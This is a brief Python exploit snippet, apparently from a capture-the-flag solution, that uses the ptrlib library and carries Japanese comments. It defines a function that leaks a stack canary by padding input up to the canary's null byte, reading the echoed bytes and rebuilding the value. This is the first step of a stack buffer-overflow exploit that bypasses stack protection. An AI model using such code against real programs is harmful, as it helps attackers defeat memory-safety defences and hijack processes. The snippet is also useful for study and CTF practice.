from ptrlib import *

# canaryのリーク
def canary_leak(elf, proc, padding_size: int):
    payload = b'P' * 0x10
    payload += b'P' * 8
    payload += b'P' # カナリー一歩手前
    proc.sendafter("Input (1/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload)) # ゴミ
    leaked = proc.recv(7)
    leaked_canary = int.from_bytes(leaked, byteorder='little')
    return (leaked_canary * 0x100)

